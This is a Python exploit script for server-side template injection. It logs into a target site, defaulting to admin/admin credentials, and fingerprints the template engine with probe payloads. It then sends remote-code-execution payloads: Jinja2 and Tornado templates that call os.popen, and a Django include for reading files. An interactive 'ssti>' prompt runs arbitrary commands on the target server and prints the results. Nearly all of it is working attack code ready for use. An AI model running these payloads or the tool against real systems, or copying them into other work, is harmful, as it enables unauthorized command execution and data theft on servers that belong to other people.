#!/usr/bin/env python3
import requests
import argparse
import sys
import re

DELIM_START = "===SSTI_START==="
DELIM_END = "===SSTI_END==="

SSTI_TEST_PAYLOADS = {
    "jinja2": {
        "payload": "{{ namespace().__class__.__name__ }}",
        "indicator": "Namespace",
    },
    "tornado": {
        "payload": "{% for i in range(3) %}{{ i }}{% endfor %}",
        "indicator": "012",
    },
    "django": {
        "payload": "{{ 7|add:7 }}",
        "indicator": "14",
    },
    "erb": {
        "payload": "<%= 7*7 %>",
        "indicator": "49",
    },
    "twig": {
        "payload": "{{ ['a','b']|join(',') }}",
        "indicator": "a,b",
    },
}

class Jinja2SSTIExploit:
    def __init__(self, url):
        self.url = url.rstrip("/") + "/"
        self.session = requests.Session()

    # ---------- AUTH ----------
    def login(self, username="admin", password="admin"):
        print(f"[*] Logging in with {username} and {password}")

        r = self.session.get(self.url + "login")
        xsrf = self.session.cookies.get("_xsrf")

        if not xsrf:
            raise Exception("[-] XSRF token not found")

        data = {
            "username": username,
            "password": password,
            "_xsrf": xsrf
        }

        headers = {"X-XSRFToken": xsrf}

        r = self.session.post(
            self.url + "login",
            data=data,
            headers=headers,
            allow_redirects=True
        )

        print("[DEBUG] Cookies:", self.session.cookies.get_dict())

        # Verify login by accessing a protected page
        r2 = self.session.get(self.url)

        if "login" in r2.text.lower():
            raise Exception("[-] Login failed")

        print("[+] Login successful")

    # ---------- DETECTION ----------
    def test_ssti(self, parameter):
        print("[*] Running SSTI detection payloads")

        initial_test_payloads = {
            "payload": "{{7*7}}",
            "indicator": "49",
        }

        # Test the initial payload to see if the web app has an SSTI vulnerability
        r = self.session.get(
            self.url,
            params={parameter: initial_test_payloads["payload"]},
            timeout=5
        )

        if initial_test_payloads["indicator"] in r.text.strip():
            print("[+] SSTI detected")

        for engine, test in SSTI_TEST_PAYLOADS.items():
            payload = test["payload"]
            indicator = test["indicator"]

            r = self.session.get(
                self.url,
                params={parameter: payload},
                timeout=5
            )

            if indicator in r.text.strip():
                print(f"[+] SSTI detected ({engine})")
                return engine

        return "jinja2" # Default to jinja2

    # ---------- PAYLOADS ----------
    def build_payloads(self, engine, cmd):
        cmd = repr(cmd)
        wrapped = f"{DELIM_START}{{{{OUTPUT}}}}{DELIM_END}"

        # For Jinja2 use the following format: {{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}
        if engine == "jinja2":
            return [
                wrapped.replace(
                    "{{OUTPUT}}",
                    f"{{{{request.application.__globals__.__builtins__.__import__('os').popen({cmd}).read()}}}}"
                )
            ]
        
        # For tornado use the following format: {% import os %}{{ os.popen("whoami").read() }}
        elif engine == "tornado":
            return [
                wrapped.replace(
                    "{{OUTPUT}}",
                    '{% import os %}{{ os.popen(' + cmd + ').read() }}'
                )
            ]

        # For Django, RCE is harder so let's just read files instead. Use the following payload format: {% include 'admin/base.html' %}
        elif engine == "django":
            return [
                wrapped.replace(
                    "{{OUTPUT}}",
                    f"{{% include '{cmd}' %}}"
                )
            ]

    # ---------- EXPLOIT ----------
    def exploit(self, method="GET", parameter="name", cmd="id"):
        if not hasattr(self, "engine") or self.engine is None:
            raise RuntimeError("SSTI engine not set")

        payloads = self.build_payloads(self.engine, cmd)

        for payload in payloads:
            if method == "GET":
                r = self.session.get(
                    self.url,
                    params={parameter: payload},
                    timeout=30
                )
            elif method == "POST":
                r = self.session.post(
                    self.url,
                    data={parameter: payload},
                    timeout=30
                )
            else:
                raise ValueError(f"Unsupported HTTP method: {method}")

            output = self.extract_output(r.text)
            if output:
                return output

        print("[-] Command execution failed")
        print("[DEBUG] Response:", r.text)
        return None

    # ---------- OUTPUT PARSING ----------
    def extract_output(self, text):
        match = re.search(
            f"{DELIM_START}(.*?){DELIM_END}",
            text,
            re.DOTALL
        )
        return match.group(1).strip() if match else None


# ---------- MAIN ----------
def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("url", help="Target base URL")
    parser.add_argument("parameter", help="Injectable parameter")

    parser.add_argument(
        "--login",
        action="store_true",
        help="Perform login before exploitation"
    )

    parser.add_argument("--username", help="Username for login")
    parser.add_argument("--password", help="Password for login")

    parser.add_argument(
        "--engine",
        help="Force SSTI engine (jinja2, tornado, django, erb, twig)"
    )

    parser.add_argument(
        "--method",
        help="HTTP method (GET, POST)"
    )

    args = parser.parse_args()
    exploit = Jinja2SSTIExploit(args.url)

    if args.login:
        exploit.login(args.username, args.password)

    print("[*] Testing for SSTI...")

    # ---------- ENGINE SELECTION ----------
    if args.engine:
        exploit.engine = args.engine.lower()
        print(f"[+] SSTI engine forced: {exploit.engine}")
    else:
        exploit.engine = exploit.test_ssti(args.parameter)

    if exploit.engine is None:
        print("[-] SSTI not detected")
        sys.exit(1)
    
    if exploit.engine == "django":
        print("[+] RCE is hard with Django, so let's read files instead")

    print(f"[+] SSTI confirmed ({exploit.engine}), entering interactive shell")

    # ---------- INTERACTIVE LOOP ----------
    while True:
        try:
            cmd = input("ssti> ").strip()
            if cmd.lower() in ("exit", "quit"):
                break

            output = exploit.exploit(args.method, args.parameter, cmd)
            if output:
                print(output)
            else:
                print("[-] No output")

        except KeyboardInterrupt:
            break

        except Exception as e:
            print(f"[-] Error: {e}")

if __name__ == "__main__":
    main()
